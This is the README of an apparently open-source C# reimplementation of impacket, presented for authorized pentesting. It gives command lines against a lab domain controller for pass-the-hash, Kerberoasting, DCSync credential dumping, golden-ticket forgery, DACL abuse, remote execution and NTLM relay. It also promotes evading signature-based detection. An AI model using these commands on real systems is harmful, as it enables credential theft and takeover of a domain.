<div align="center">

# DotNetPacket

### impacket, rewritten in C#.

**A .NET 8 port of [impacket](https://github.com/fortra/impacket) — its protocol structures, clients, and `examples/` scripts — as a single self-contained binary for Windows, Linux, and macOS.**

SMB2/3 · DCERPC (MSRPC) · LDAP · Kerberos · NTLM/SPNEGO · TDS · DCSync · Kerberoasting · S4U · NTLM relay — no Python, no dependencies, one executable.

[![.NET](https://img.shields.io/badge/.NET-8.0-512BD4?logo=dotnet&logoColor=white)](https://dotnet.microsoft.com/)
[![CI](https://github.com/SieBRUM/dotnetpacket/actions/workflows/ci.yml/badge.svg)](../../actions/workflows/ci.yml)
[![Tests](https://img.shields.io/badge/tests-306%20passing-success)](tests/)
[![Release](https://img.shields.io/github/v/release/SieBRUM/dotnetpacket?include_prereleases&sort=semver)](../../releases)

</div>

---

> [!NOTE]
> For authorized engagements and research only — pentests, red-team ops, CTFs, and lab work on
> systems you have permission to test. You are responsible for staying in scope.

## What it is

DotNetPacket re-implements impacket's protocol stack and its `examples/` scripts in C#, so you get
impacket's AD tradecraft as **one self-contained native binary** — nothing to `pip install`, no
Python on disk, drops cleanly onto a Windows host or runs from your Linux box. The wire protocols are
built to match a real modern-Windows client (SMB 2/3 with 3.1.1 negotiate contexts, proper signing,
real capability sets), and every ported structure cites the impacket class it came from.

A side effect worth knowing: because it's a ground-up .NET rewrite, it does **not** carry impacket's
Python-shaped artifacts — the default capability flags, field orderings, hardcoded task timestamps,
`Server: BaseHTTP/… Python/…` banners and other tool-specific strings that signature-based rules
love to key on. Same protocol behavior, different fingerprint. The per-call differences are catalogued
in [`docs/WIRE_DIFF.md`](docs/WIRE_DIFF.md).

## Features

A realistic, **signed**, modern-Windows-style stack, validated end-to-end against a Samba AD DC:

- **SMB 2/3** — `NEGOTIATE` with the full modern-Windows set of 3.1.1 negotiate contexts (preauth
  integrity, encryption, compression, netname, signing — five, where impacket sends two), NTLMv2 `SESSION_SETUP` (SPNEGO + MIC),
  SP800-108 KDF + AES-CMAC message signing, **SMB3 session encryption** (AES-128/256-CCM/GCM
  `TRANSFORM_HEADER`, so it talks to `encrypt = required` shares), `TREE_CONNECT`,
  `CREATE/READ/WRITE/CLOSE`, `QUERY_DIRECTORY`, `QUERY_INFO`, `SET_INFO`, `IOCTL`.
- **DCERPC** (MSRPC) over both named pipes (`ncacn_np`) and TCP (`ncacn_ip_tcp`), with
  NTLMSSP-authenticated **sign & seal**, an NDR marshaller, and clients for `srvsvc`, `wkssvc`,
  `lsarpc`, `lsat`, `samr`, `svcctl`, `winreg`, `tsch`, `mgmt`, `epm`, `drsuapi`.
- **LDAP** (RFC 4511) — over plaintext 389 **or LDAPS (TLS on 636)**; bind (simple + GSS-SPNEGO NTLM +
  sealed Kerberos), the full search filter grammar, **simple paged results** (RFC 2696, so enumerations
  survive AD's 1000-object cap), add/modify/delete, and the `LDAP_SERVER_SD_FLAGS` control.
- **Kerberos v5** — AS-REQ/AS-REP (with and without pre-auth), TGS-REQ/TGS-REP, **RC4-HMAC and
  AES128/256-CTS-HMAC-SHA1-96** (RFC 3962, byte-exact vs impacket + RFC vectors), AP-REQ/AP-REP SMB
  login (`-k`, AES-256 by default), **sealed GSS-SPNEGO LDAP binds**, **S4U2self/S4U2proxy**
  constrained delegation, AS-REP-roast / Kerberoast hash output, MIT **ccache** read/write, a
  **PAC** parser + signature verifier, and **golden-ticket forgery** (`ticketer` — builds + signs a PAC
  and mints a TGT from the krbtgt key).
- **NTLM / SPNEGO**, **TDS** (MS-TDS pre-login), **GPP** cpassword, **LAPS**, and an **ntlmrelayx**
  relay server (SMB→SMB, HTTP→SMB, SMB→LDAP).

Full, per-call status is in [`docs/PORTING_STATUS.md`](docs/PORTING_STATUS.md).

## Install

Grab a self-contained binary from [**Releases**](../../releases) (no .NET runtime required) —
built for Windows, Linux, and macOS on x64 and arm64 — or build it yourself:

```bash
dotnet build -c Release
dotnet test
dotnet run --project src/DotNetPacket.Examples                 # list every command, grouped
dotnet run --project src/DotNetPacket.Examples -- help dcsync  # parameters + examples for one command
```

Needs the .NET 8 SDK and NuGet access on first build. Every command below is
`dotnetpacket <command> …` from a release build (or
`dotnet run --project src/DotNetPacket.Examples -- <command> …` from source). Run
`dotnetpacket help <command>` for any command's full parameter list and examples; run
`dotnetpacket help` for the grouped catalogue with the credential-target and global-option primers.

## Usage

> `[domain]` is the short NetBIOS name (e.g. `LAB`); `<domain-fqdn>` is the DNS name (e.g.
> `lab.local`); `[port]` defaults sensibly per protocol (445 SMB, 389 LDAP, 88 Kerberos). The first
> positional `<host>` is the target (and the DC) — a name or an IP. Anything in `[brackets]` is
> optional.

### Credentials & global options (impacket-style)

Credentials are an impacket-style target string in the first positional — `[[domain/]username[:password]@]host`.
There are no separate `<user> <pass>` args. When you authenticate with a ticket or a hash the password is
**optional** — just leave off the `:password` (no placeholder):

```bash
# password, in the target
dotnetpacket rpc-samrdump 'LAB/alice:Passw0rd!@dc01.lab.local'
# pass-the-hash — no password at all
dotnetpacket dcsync 'lab.local/alice@dc01.lab.local' Administrator LAB -hashes :ac8d0d3c9858659864b8493a51050efd
# Kerberos from a ccache
KRB5CCNAME=alice.ccache dotnetpacket get-adusers 'lab.local/alice@dc01.lab.local' -k
```

> In the tables below, `<target>` means `[[domain/]username[:password]@]host`. Commands that need the
> DNS domain (LDAP / Kerberos / DCSync) take it from the `domain/` part of the target, so use the FQDN
> there: `lab.local/alice:pass@dc01`.
>
> **Passwords with special characters** parse exactly like impacket's `parse_target`: the host is split
> on the **last** `@`, so a password may contain `@`, `:` and `/` (e.g. `LAB/alice:P@ss:w/rd!@dc01` →
> user `alice`, password `P@ss:w/rd!`). **Quote the whole target in your shell** — single quotes are
> safest, since `!`, `$`, spaces and `()` are shell metacharacters (bash also does history expansion on
> `!` inside double quotes). If the password itself must stay out of the process args entirely, pass
> `-hashes`/`-aesKey`/`-k` and drop the `:password`.

These flags work with **any** command and can appear anywhere on the line, like impacket:

| Option | What it does |
| --- | --- |
| `-hashes [LM]:NT` | **Pass-the-hash** — authenticate with the NT hash (only NTHASH is used for NTLMv2). No password needed. |
| `-no-pass` | Don't use/ask for a password (pair with `-k` / a ccache). |
| `-ldaps` | Connect the LDAP tools over **TLS (636)** instead of plaintext 389 (impacket's `-use-ldaps`). A simple bind then works against a DC that enforces LDAP signing / channel binding and refuses plaintext binds. |
| `-smb3-seal` | Turn on **SMB3 session encryption** (AES-CCM/GCM `TRANSFORM_HEADER`) after login — required to reach an `smb encrypt = required` share. Needs an SMB 3.1.1 session. |
| `-k` | **Kerberos** — AP-REQ instead of NTLM. With a password the KDC's etypes are probed and the strongest used (**AES-256 by default**). Loads a TGT from `-ccache`/`KRB5CCNAME` if present. |
| `-aesKey <hex>` | **Overpass-the-hash** with a 128/256-bit AES Kerberos key (implies `-k`). |
| `-ccache <file>` | Use a cached TGT (MIT ccache v4); also read from `KRB5CCNAME`. |
| `-save-ccache <file>` | Write the obtained ticket to a ccache (`kerb-tgt`, `get-st`) — reusable by `klist` / impacket. |
| `-dc-ip <ip>` | KDC address for `-k` (defaults to the host). |
| `-target-ip <ip>` | Connect here while using the host arg as the SPN/logical name (SPN host ≠ reachable address). |
| `-proxy <url>` | Route **all** TCP through a proxy: `socks5://[user:pass@]host:port`, `socks4a://…`, `socks4://…`, `http://[user:pass@]host:port`. The target hostname is handed to the proxy so it resolves on the far side of a pivot. |

> **`-k` covers both SMB and LDAP.** For SMB it performs a real AP-REQ login (AS → service ticket for
> `cifs/<host>` → AP-REQ → `SESSION_SETUP`), AES-256 by default, signing keyed on the AP-REP acceptor
> subkey ([MS-KILE] 3.1.1.2) so privileged calls actually authorize. For the LDAP tools it does a
> GSS-SPNEGO bind for `ldap/<host>` and then **seals** every PDU (AES CFX for a password/`-aesKey`
> ticket, RC4 for `-hashes`), as a modern DC requires. The AES128/256-CTS-HMAC-SHA1-96 crypto is
> byte-exact against impacket and the RFC 3962 vectors.

### Pivoting / Proxynator 🔀

Runs cleanly behind a SOCKS/HTTP pivot — the way you'd run NetExec or impacket behind a C2's SOCKS
server — either with `-proxy socks5://…` or transparently through
**[Proxynator](https://github.com/SieBRUM/proxynator)**'s kernel modes (add a rule for
`DotNetPacket.Examples`/`netpacket` → your pivot, no flags). Everything is plain TCP, including
**Kerberos over TCP/88** (no UDP fallback), and connections are made **by hostname** so remote DNS
resolves on the far side of the pivot.

### Examples

Worked flows against the throwaway lab DC (`tools/lab-addc.sh up` prints the credentials). From a
release build these are `dotnetpacket <command> …`; from source, `dotnet run --project
src/DotNetPacket.Examples -- <command> …`. Single-quote the whole target so `!`, `@`, `:`, `/` in a
password reach the parser. `dotnetpacket help <command>` has per-parameter help for any of them.

**Enumerate a domain over SMB / RPC**

```bash
# who's answering? — reads the NTLM challenge, no credentials
dotnetpacket smb-ntlminfo 127.0.0.1

# users, groups, and the password policy in one shot (samrdump)
dotnetpacket rpc-samrdump 'LAB/Administrator:LabAdm1n!Pass@127.0.0.1'

# RID-cycle to enumerate accounts without a directory read
dotnetpacket lookupsid 'LAB/Administrator:LabAdm1n!Pass@127.0.0.1' 1200

# list shares, then read a file over SMB2
dotnetpacket rpc-shares 'LAB/Administrator:LabAdm1n!Pass@127.0.0.1'
dotnetpacket smb2-cat   'LAB/Administrator:LabAdm1n!Pass@127.0.0.1' C$ Windows\\win.ini
```

**Kerberos — roast, then reuse a ticket**

```bash
# AS-REP roast (no pre-auth) and Kerberoast (SPN accounts)
dotnetpacket get-npusers  'lab.local/Administrator:LabAdm1n!Pass@127.0.0.1'
dotnetpacket get-userspns 'lab.local/Administrator:LabAdm1n!Pass@127.0.0.1'

# cache a TGT, then reuse it with -k — the password never goes on the wire again
dotnetpacket kerb-tgt 'lab.local/Administrator:LabAdm1n!Pass@127.0.0.1' -save-ccache admin.ccache
KRB5CCNAME=admin.ccache dotnetpacket get-adusers 'lab.local/Administrator@127.0.0.1' -k
```

**DCSync (secretsdump)**

```bash
# one account, with a password
dotnetpacket dcsync 'lab.local/Administrator:LabAdm1n!Pass@127.0.0.1' krbtgt

# ... or pass-the-hash, no password on the line (note the leading colon = empty LM)
dotnetpacket dcsync 'lab.local/Administrator@127.0.0.1' krbtgt -hashes :ac8d0d3c9858659864b8493a51050efd

# the whole domain, authenticated with Kerberos (one host/<dc> ticket seals it all)
dotnetpacket dcsync-all-k 'lab.local/Administrator:LabAdm1n!Pass@127.0.0.1' vm.lab.local -k
```

**Golden ticket (forge a TGT from the krbtgt key)**

```bash
# 1) get the krbtgt key + domain SID (DCSync), 2) forge, 3) use the ticket with -k
dotnetpacket dcsync 'lab.local/Administrator:LabAdm1n!Pass@127.0.0.1' krbtgt        # -> krbtgt aes256 key
dotnetpacket ticketer lab.local LAB S-1-5-21-... Administrator <krbtgt-aes256-hex> -save-ccache golden.ccache
KRB5CCNAME=golden.ccache dotnetpacket smb2-login 'lab.local/Administrator@dc01.lab.local' -k
```

**Edit an object's DACL, then read it back**

```bash
dotnetpacket dacledit write 'lab.local/Administrator:LabAdm1n!Pass@127.0.0.1' victim attacker FullControl
dotnetpacket dacledit read  'lab.local/Administrator:LabAdm1n!Pass@127.0.0.1' victim
```

**SMB3 encryption (reach an `encrypt = required` share)**

```bash
# the login prints the negotiated cipher; -smb3-seal encrypts every post-auth message
dotnetpacket smb2-login 'LAB/Administrator:LabAdm1n!Pass@127.0.0.1' -smb3-seal
dotnetpacket smb2-ls    'LAB/Administrator:LabAdm1n!Pass@127.0.0.1' sysvol -smb3-seal
```

**Against a hardened DC — LDAP over TLS**

```bash
# is LDAPS up, and does the DC refuse unsigned/plaintext binds?
dotnetpacket ldap-signing 127.0.0.1 lab.local

# bind over TLS (636) — works even when the DC rejects plaintext 389 binds
dotnetpacket get-adusers 'lab.local/Administrator:LabAdm1n!Pass@127.0.0.1' all -ldaps
```

**Through a SOCKS pivot**

```bash
dotnetpacket rpc-samrdump 'LAB/Administrator:LabAdm1n!Pass@dc01.lab.local' -proxy socks5://127.0.0.1:1080
```

### SMB2/3 — files, shares, recon

| Command | Parameters | impacket | Does |
| --- | --- | --- | --- |
| `smb2-negotiate` | `<host> [port]` | — | SMB2 NEGOTIATE, dump both directions |
| `smb2-login` | `<target> [port]` | — | NTLMv2 SESSION_SETUP |
| `smb2-connect` | `<target> <share> [port]` | — | signed TREE_CONNECT |
| `smb2-cat` | `<target> <share> <path> [port]` | `smbclient` | read a file (CREATE/READ/CLOSE) |
| `smb2-ls` | `<target> <share> [path] [port]` | `smbclient` | directory listing |
| `smb2-info` | `<target> <share> [port]` | — | volume / filesystem info |
| `smb-attrib` / `smb-attrib-set` | `<target> <share> <path> [attrs]` | `attrib.py` | read / set DOS attributes |
| `smb-ntlminfo` | `<host> [port]` | `DumpNTLMInfo.py` | host/OS/DNS names from the NTLM handshake — **no creds** |
| `gpp-passwords` | `<target> [share] [port]` | `Get-GPPPassword.py` | crawl SYSVOL, decrypt GPP `cpassword` |

### DCERPC recon — srvsvc · wkssvc · lsarpc · lsat · samr · winreg

| Command | Parameters | impacket | Does |
| --- | --- | --- | --- |
| `dcerpc-bind` | `<target> [iface]` | — | bind a named-pipe interface over IPC$ |
| `rpc-shares` / `rpc-shares-sealed` | `<target> [seal\|sign]` | `srvsvc` | share enum (plain / signed+sealed) |
| `rpc-hostinfo` / `rpc-srvinfo` | `<target>` | `srvsvc`/`wkssvc` | host, OS, and server-tunable recon |
| `rpc-services` / `rpc-svcconfig` / `rpc-svcstatus` | `<target> [service]` | `services.py` | service enum / config / live status |
| `rpc-lsa` / `rpc-privs` / `rpc-accountrights` / `rpc-privlookup` | `<target> [sid\|privilege]` | `lsarpc` | policy, SID, privilege & rights enum; privilege name ↔ LUID |
| `rpc-lookupsid` / `rpc-lookupsid2` / `rpc-lookupnames[2]` | `<target> [names]` | `lookupsid.py` | SID ↔ name resolution |
| `lookupsid` | `<target> [maxRid=1100] [port]` | `lookupsid.py` | **RID cycling** — enumerate accounts with no directory read |
| `rpc-enumusers` / `rpc-enumgroups` / `rpc-samrdump` | `<target>` | `samrdump.py` | SAMR user/group dump + policy |
| `rpc-lookuprid` / `rpc-lookupid` | `<target> <names-csv\|rids-csv>` | `samrdump.py` | SAMR name → RID / RID → name resolution |
| `rpc-userinfo` / `rpc-dispinfo` / `rpc-dispgroups` / `rpc-domaininfo` / `rpc-aliasmem` | `<target> [target]` | `samrdump.py` | per-user / display / domain / alias detail |
| `rpc-passpol` | `<target>` | `samrdump.py` | domain password policy |
| `rpc-reg` / `rpc-regquery` / `rpc-regenum` / `rpc-regkeys` | `<target> [subkey] [value]` | `reg.py` | remote-registry read/enum |
| `rpc-dump` / `rpc-dump-tcp` | `<target>   (auth required)` | `rpcdump.py` | registered-interface enumeration |
| `rpc-getarch` / `rpc-epm-map` / `rpc-samr-tcp` | `<host> [iface\|user…]` | `getArch.py`/epm | arch probe · ept_map · sealed SAMR over TCP |

### AD / LDAP

| Command | Parameters | impacket | Does |
| --- | --- | --- | --- |
| `get-adcomputers` | `<target> [port]` | `GetADComputers.py` | LDAP search for computer objects |
| `get-adusers` | `<target> [all] [port]` | `GetADUsers.py` | LDAP search for user accounts |
| `get-laps` | `<target> [computer] [port]` | `GetLAPSPassword.py` | read LAPS passwords from LDAP |
| `find-delegation` | `<target> [target-user] [port]` | `findDelegation.py` | unconstrained / constrained / protocol-transition / **RBCD** |
| `ldap-signing` | `<host> <domain> [port]` | `CheckLDAPStatus` | does the DC require LDAP signing? + **LDAPS/TLS posture** (TLS version, cipher, server cert) |

### Kerberos

| Command | Parameters | impacket | Does |
| --- | --- | --- | --- |
| `get-npusers` | `<target> [target-user] [port]` | `GetNPUsers.py` | AS-REP roast (accounts without pre-auth) |
| `kerb-tgt` | `<target> [port]` | `getTGT.py` | request a TGT (probes the KDC; AES-256 PA-ENC-TIMESTAMP by default, RC4 fallback) |
| `get-userspns` | `<target> [target-user] [port]` | `GetUserSPNs.py` | Kerberoast SPN accounts |
| `get-st` | `<domain-fqdn/service-user[:password]@dc-host> <impersonate> <target-spn> [port]` | `getST.py` | S4U2self + S4U2proxy — a constrained-delegation ticket impersonating a user |
| `getpac` | `<dc-host> <service-user> <domain-fqdn> <impersonate> <service-key-hex> [krbtgt-key-hex] [port]` | `getPac.py` | S4U2self, decrypt the ticket, parse the **PAC** (RID, groups, ExtraSids) and verify its SERVER/KDC signatures |
| `ticketer` | `<domain-fqdn> <netbios> <domain-sid> <username> <krbtgt-key-hex> [user-rid=500]` | `ticketer.py` | **golden ticket** — forge a TGT (+ signed PAC with PAC_REQUESTOR/ATTRIBUTES) from the krbtgt key into a ccache |
| `rpc-changepw` | `<target> <newpass> [port]` | `changepasswd.py` | change a password (SAMR) |

### Credential dumping — DCSync

| Command | Parameters | impacket | Does |
| --- | --- | --- | --- |
| `dcsync` | `<target> <target-user> [netbios] [epm-port]` | `secretsdump.py` | replicate one account via DRSUAPI (`DsGetNCChanges` / `EXOP_REPL_OBJ`): NT hash + Kerberos keys (aes256/aes128/des) + cleartext |
| `dcsync-all` | `<target> [netbios] [epm-port]` | `secretsdump.py` | enumerate every account (SAMR) and DCSync each by SID — the whole-domain dump |
| `dcsync-k` | `<target> <target-user> <dc-fqdn> [netbios] [epm-port]` | `secretsdump.py -k` | DCSync authenticated with Kerberos (DCE-style GSS sealed DRSUAPI bind) |
| `dcsync-all-k` | `<target> <dc-fqdn> [netbios] [epm-port]` | `secretsdump.py -k` | whole-domain DCSync over Kerberos — one `host/<dc-fqdn>` ticket seals the SAMR enum and the DRSUAPI replication |

### ACL / delegation / account edits

| Command | Parameters | impacket | Does |
| --- | --- | --- | --- |
| `dacledit` | `<read\|write\|remove\|backup\|restore> <target> <target> [principal] [rights] [ace-type] [file]` | `dacledit.py` | read / edit an object's DACL (e.g. grant **DCSync**) |
| `owneredit` | `<read\|write> <target> <target> [new-owner]` | `owneredit.py` | read / set an object's owner |
| `rbcd` | `<read\|write\|remove\|flush> <target> <delegate-to> [delegate-from]` | `rbcd.py` | resource-based constrained delegation |
| `badsuccessor` | `<search\|add\|delete\|modify> <target> [dmsa] [ou] [target]` | `badsuccessor.py` | dMSA "BadSuccessor" (Server 2025) |
| `rpc-addcomputer` | `<target> <computer-name> [port]` | `addcomputer.py` | create + delete a machine account |

### Execution

| Command | Parameters | impacket | Does |
| --- | --- | --- | --- |
| `smbexec` | `<target> <command> [share=C$] [port]` | `smbexec.py` | command exec via a one-shot svcctl service |
| `atexec` | `<target> <command> [port]` | `atexec.py` | command exec via the Task Scheduler |
| `rpc-svcctl` | `<target> [port]` | `psexec`-ish | service create/start/delete |

### NTLM relay

| Command | Parameters | impacket | Does |
| --- | --- | --- | --- |
| `ntlmrelayx` | `<target> [listen-port] [victim-user victim-pass [domain]]` | `ntlmrelayx.py` | SMB→SMB NTLM relay + NetNTLMv2 capture |
| `ntlmrelayx-http` | `<target> [listen-port] [victim-user victim-pass [domain]]` | `ntlmrelayx.py` | HTTP→SMB relay (coerces `WWW-Authenticate: NTLM`) |
| `ntlmrelayx-ldap` | `<dc-host> <listen-port> <victim-user> <victim-pass> <domain-fqdn>` | `ntlmrelayx.py` | SMB→LDAP relay (`ldapattack`) |

### Misc

| Command | Parameters | impacket | Does |
| --- | --- | --- | --- |
| `mssql-cbt` | `<host> [port]` | `checkMSSQLStatus.py` | TDS PRELOGIN encryption posture (channel-binding precondition) |
| `smb-header` / `ntlm-negotiate` | — | — | build + hex-dump a reference structure |

## Need a target?

[`tools/lab-addc.sh`](tools/lab-addc.sh) stands up a throwaway, loopback-bound Samba AD DC
(`up` / `down` / `status` / `destroy`) and prints the credentials to use.

## Documentation

| Doc | What's in it |
| --- | --- |
| [`CLAUDE.md`](CLAUDE.md) | Project scope, full repo layout, the (de)serialization engine, how to port a structure |
| [`docs/PORTING_STATUS.md`](docs/PORTING_STATUS.md) | What's ported, what's validated, what's next |
| [`docs/WIRE_DIFF.md`](docs/WIRE_DIFF.md) | The per-call DotNetPacket-vs-impacket wire/fingerprint differences |
| [`docs/REALISM.md`](docs/REALISM.md) | The rules for making traffic look like a real client |
| [`docs/PORTING_GUIDE.md`](docs/PORTING_GUIDE.md) | The mechanical impacket → .NET recipe |

## License & scope

A faithful impacket reimplementation for authorized security testing and research. Don't point it at
anything you don't have written permission to test. Project scope and conventions are in
[`CLAUDE.md`](CLAUDE.md).
